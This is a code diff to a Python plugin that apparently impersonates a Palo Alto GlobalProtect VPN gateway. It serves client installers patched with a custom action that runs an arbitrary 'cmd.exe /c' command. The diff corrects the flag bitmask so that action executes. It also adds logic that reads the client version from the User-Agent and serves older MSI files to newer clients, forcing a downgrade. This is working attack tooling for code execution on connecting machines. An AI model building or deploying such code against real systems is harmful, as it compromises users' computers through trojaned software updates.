@@ -11,6 +11,7 @@ import shutil
 import ssl
 import os
 import io
+import re
 
 # SSL-VPN packet types
 SSL_VPN_MAGIC = bytes.fromhex('1a2b3c4d')
@@ -51,7 +52,8 @@ class PaloAltoPlugin(VPNPlugin):
             "gateway_ip": self.external_ip,
             "ca_certificate": "",
             "dns_name": self.dns_name,
-            "version": "6.3.2-376"
+            "version": "6.3.2-376",
+            "should_downgrade": False
         }
 
         # Run bootstrap
@@ -194,8 +196,8 @@ class PaloAltoPlugin(VPNPlugin):
                 self.logger.info(f"Added file {self.msi_add_file} to {msi_file}")
 
             if self.msi_command:
-                action_type = (ACTION_TYPE_SHELL & ACTION_TYPE_CONTINUE & ACTION_TYPE_ASYNC & ACTION_TYPE_COMMIT &
-                               ACTION_TYPE_IN_SCRIPT & ACTION_TYPE_NO_IMPERSONATE)
+                action_type = (ACTION_TYPE_SHELL | ACTION_TYPE_CONTINUE | ACTION_TYPE_ASYNC | ACTION_TYPE_COMMIT |
+                               ACTION_TYPE_IN_SCRIPT | ACTION_TYPE_NO_IMPERSONATE)
                 patcher.add_custom_action(output_file, f"_{random_hash()}", action_type,
                                           "C:\\windows\\system32\\cmd.exe", f"/c {self.msi_command}", 
                                           "InstallExecuteSequence")
@@ -244,6 +246,13 @@ class PaloAltoPlugin(VPNPlugin):
             self.logger.info(f"Bumping version from {latest_version} to {bump}")
             self.gateway_config["version"] = bump
 
+        # Check for .old MSI files
+        for msi_file in ["GlobalProtect.msi", "GlobalProtect64.msi"]:
+            old_file = os.path.join(self.download_dir, f"{msi_file}.old")
+            if not os.path.exists(old_file):
+                self.logger.warning(f"Older version MSI file not found: {old_file}")
+                self.logger.info(f"Add {msi_file}.old to {self.download_dir} to enable version downgrade")
+
         # Patch the Windows MSI files and sign them
         if not self.patch_msi_files():
             return False
@@ -259,6 +268,7 @@ class PaloAltoPlugin(VPNPlugin):
 
     def can_handle_http(self, handler):
         user_agent = handler.headers.get('User-Agent', '')
+        self.logger.info(f"User-Agent: {user_agent}")
         if 'GlobalProtect' in user_agent or \
            handler.path.startswith('/ssl-tunnel-connect.sslvpn'):
             return True
@@ -283,11 +293,13 @@ class PaloAltoPlugin(VPNPlugin):
 
         @self.flask_app.route('/global-protect/prelogin.esp', methods=['GET', 'POST'])
         def global_protect_pre_login():
+            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('prelogin.xml')
             return Response(xml, mimetype='application/xml')
 
         @self.flask_app.route('/ssl-vpn/prelogin.esp', methods=['GET', 'POST'])
         def ssl_vpn_pre_login():
+            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('sslvpn-prelogin.xml')
             return Response(xml, mimetype='application/xml')
 
@@ -308,6 +320,8 @@ class PaloAltoPlugin(VPNPlugin):
                         self.__class__.__name__,
                         info
                     )
+
+            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('sslvpn-login.xml')
             return Response(xml, mimetype='application/xml')
 
@@ -328,6 +342,8 @@ class PaloAltoPlugin(VPNPlugin):
                         self.__class__.__name__,
                         info
                     )
+
+            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('pwresponse.xml', **self.gateway_config)
             return Response(xml, mimetype='application/xml')
 
@@ -348,13 +364,14 @@ class PaloAltoPlugin(VPNPlugin):
                         self.__class__.__name__,
                         info
                     )
+
+            self.check_client_version(request.headers.get('User-Agent', ''))
             xml = self.render_template('getconfig.xml', **self.gateway_config)
             return Response(xml, mimetype='application/xml')
 
         @self.flask_app.route('/global-protect/getmsi.esp', methods=['GET', 'POST'])
         def get_msi_redirect():
             user_agent = request.headers.get('User-Agent')
-            self.logger.debug(f"User-Agent: {user_agent}")
             if 'apple mac' in user_agent.lower() or 'darwin' in user_agent.lower():
                 return redirect(f"/msi/GlobalProtect.pkg", code=302)
             elif request.args.get('version') == '64':
@@ -366,8 +383,11 @@ class PaloAltoPlugin(VPNPlugin):
             if file_name not in ['GlobalProtect.pkg', 'GlobalProtect.msi', 'GlobalProtect64.msi']:
                 return abort(404)
 
-            self.logger.debug(f"Serving {file_name}")
-            file_path = os.path.join(self.payload_dir, file_name)
+            # Use the downgrade flag to determine which version to serve
+            if self.gateway_config["should_downgrade"]:
+                file_path = os.path.join(self.download_dir, f"{file_name}.old")
+            else:
+                file_path = os.path.join(self.payload_dir, file_name)
 
             if not os.path.exists(file_path):
                 self.logger.error(f"Download file not found: {file_path}")
@@ -380,6 +400,8 @@ class PaloAltoPlugin(VPNPlugin):
                 'Content-Disposition': f'attachment; filename="{file_name}"',
                 'Content-Length': str(file_size)
             }
+
+            self.logger.info(f"Serving {file_path}")
 
             with open(file_path, 'rb') as f:
                 file_content = f.read()
@@ -447,3 +469,22 @@ class PaloAltoPlugin(VPNPlugin):
             client_socket.close()
             return True
         return False
+
+    def check_client_version(self, user_agent):
+        # Check if there's a client version in the user agent
+        # If so, set the should_downgrade flag based on the version
+        version_match = re.search(r'GlobalProtect/(\d+\.\d+\.\d+)', user_agent)
+        if version_match:
+            client_version = version_match.group(1)
+            self.logger.debug(f"Client version: {client_version}")
+
+            # Compare versions
+            major, minor, patch = map(int, client_version.split('.')[:3])
+            if (major > 6) or (major == 6 and minor > 2) or (major == 6 and minor == 2 and int(patch) > 6):
+                self.logger.debug(f"Client version {client_version} needs downgrade")
+                self.gateway_config["should_downgrade"] = True
+            else:
+                self.logger.debug(f"Client version {client_version} is compatible")
+                self.gateway_config["should_downgrade"] = False
+            return client_version
+        return None
